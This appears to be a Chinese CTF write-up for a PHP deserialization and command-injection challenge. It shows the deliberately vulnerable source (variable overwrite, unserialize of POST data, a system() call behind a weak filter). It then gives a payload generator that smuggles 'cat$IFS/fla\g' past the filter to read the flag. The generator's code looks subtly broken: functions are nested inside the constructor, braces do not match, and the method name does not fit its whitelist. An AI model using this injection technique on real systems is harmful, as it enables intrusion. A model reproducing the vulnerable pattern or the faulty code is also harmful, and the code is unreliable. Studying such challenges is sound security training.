          <p>遍历文件夹：var_dump(scandir(‘./‘))<br>查看源码：show_source(‘’);<br><strong>源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class come&#123;    </span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">    function __construct($method, $args) &#123;</span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        foreach($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;args[$k] = $this-&gt;waf(trim($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)&#123;</span><br><span class="line">        $str=preg_replace(&quot;/[&lt;&gt;*;|?\n ]/&quot;,&quot;&quot;,$str);</span><br><span class="line">        $str=str_replace(&apos;flag&apos;,&apos;&apos;,$str);</span><br><span class="line">        return $str;</span><br><span class="line">    &#125;           </span><br><span class="line">    function echo($host)&#123;</span><br><span class="line">        system(&quot;echo $host&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if (in_array($this-&gt;method, array(&quot;echo&quot;))) &#123;</span><br><span class="line">            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$first=&apos;hi&apos;;</span><br><span class="line">$var=&apos;var&apos;;</span><br><span class="line">$bbb=&apos;bbb&apos;;</span><br><span class="line">$ccc=&apos;ccc&apos;;</span><br><span class="line">$i=1;</span><br><span class="line">foreach($_GET as $key =&gt; $value) &#123;</span><br><span class="line">        if($i===1)</span><br><span class="line">        &#123;</span><br><span class="line">            $i++;</span><br><span class="line">            $$key = $value;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;break;&#125;</span><br><span class="line">&#125;</span><br><span class="line">if($first===&quot;doller&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    @parse_str($_GET[&apos;a&apos;]);</span><br><span class="line">    if($var===&quot;give&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        if($bbb===&quot;me&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            if($ccc===&quot;flag&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                echo &quot;&lt;br&gt;welcome!&lt;br&gt;&quot;;</span><br><span class="line">                $come=@$_POST[&apos;come&apos;];</span><br><span class="line">                unserialize($come); </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;echo &quot;&lt;br&gt;think about it&lt;br&gt;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;NO&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Can you hack me?&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p><strong>反序列化payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class come&#123;</span><br><span class="line"> private $method;</span><br><span class="line"> private $args;</span><br><span class="line"> function __construct($method, $args) &#123;</span><br><span class="line"> $this-&gt;method = &quot;echo&quot;;</span><br><span class="line"> $this-&gt;args = array(&quot;host&quot;=&gt;&quot;&apos;test&apos;&amp;&amp;cat\$IFS/fla\g&quot;);</span><br><span class="line"> function __wakeup()&#123;</span><br><span class="line"> foreach($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line"> $this-&gt;args[$k] = $this-&gt;waf(trim($v));</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> function waf($str)&#123;</span><br><span class="line"> $str=preg_replace(&quot;/[&lt;&gt;*;|?\n ]/&quot;,&quot;&quot;,$str);</span><br><span class="line"> $str=str_replace(&apos;flag&apos;,&apos;&apos;,$str);</span><br><span class="line"> return $str;</span><br><span class="line"> &#125;</span><br><span class="line"> function echo1($host)&#123;</span><br><span class="line"> system(&quot;echo $host&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> function __destruct()&#123;</span><br><span class="line"> if (in_array($this-&gt;method, array(&quot;echo1&quot;))) &#123;</span><br><span class="line"> call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$A=new come();</span><br><span class="line">echo urlencode(serialize($A));</span><br><span class="line">这里函数名为`echo`比较坑，函数名为内置函数有的版本 php 会报错。所以我改成了</span><br><span class="line">`echo1`</span><br></pre></td></tr></table></figure></p>
